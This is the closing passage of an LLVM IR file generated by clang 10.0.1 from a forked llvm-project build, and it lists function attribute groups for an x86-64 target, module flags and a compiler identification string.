attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
